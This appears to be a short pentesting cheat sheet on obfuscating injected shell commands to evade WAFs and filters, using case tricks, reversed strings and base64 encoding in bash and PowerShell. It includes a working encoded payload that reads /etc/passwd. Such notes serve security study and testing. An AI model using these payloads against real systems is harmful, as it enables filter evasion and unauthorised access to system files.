# Advanced Command Obfuscation
***
#### When we are faced with advanced filtering solutions, like  WAFs, we would need advanced techniques for such cases.

### Case Manipulation
#### If we are dealing with a Windows server, we could change freely the casing of the chars
#### Example:
```shell
> Wh0aMi
root
```
#### With Linux or bash shells, we can achieve the same but using a more interesting method
```bash
$ $(tr "[A-Z]" "[a-z]"<<<"Wh0aMi")
root
```

```bash
$ $(a="Wh0aMi";printf %s "${a,,}")
root
```

##### **Note**: Linux systems are case sensitive


### Reversed Commands
#### Reversing commands and having a command template that switches them back and executes is another obfuscation technique.
#### For example imaohw = whoami , avoiding being detected .
#### First step:
```bash
$ echo 'whoami' | rev
imaohw
```
#### Then we simply execute the original command by reversing it back in a sub-shell ($())
```bash
$ $(rev<<<'imaohw')
root
```

#### The same can be applied in Windows
##### Reverse a string:
```shell
> "whoami"[-1..-20] -join ''
imaohw
```
#### Execute reversed string using a PowerShell sub-shell:
```shell
> iex "$('imaohw' [-1..-20] -join '')"
root
```

### Encoded Commands
#### This technique is helpful for commands containing filtered characters or characters that mey be URL-decoded by the server
#### There are various encoding tools that we can use ,for example, **base64** or **xxd** (for hex encoding)
#### Example:
```shell
$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```
#### Then we create a command to decode the encoded string in a sub-shell , and then pass it to bash to be executed
```shell
$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```
#### **Note**: The pipe character wasn't used above because it's a common filtered character

#### It is also possible on Windows
#### First we encode our string to base64
```shell
> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

#### The above result can be achieved in Linux by converting the string from utf-8 to utf-16 before base64 encode it
```shell
$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```
#### Then we decode the b64 string and execute it with a PowerShell sub-shell
```shell
>  iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

root
```

#### [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)
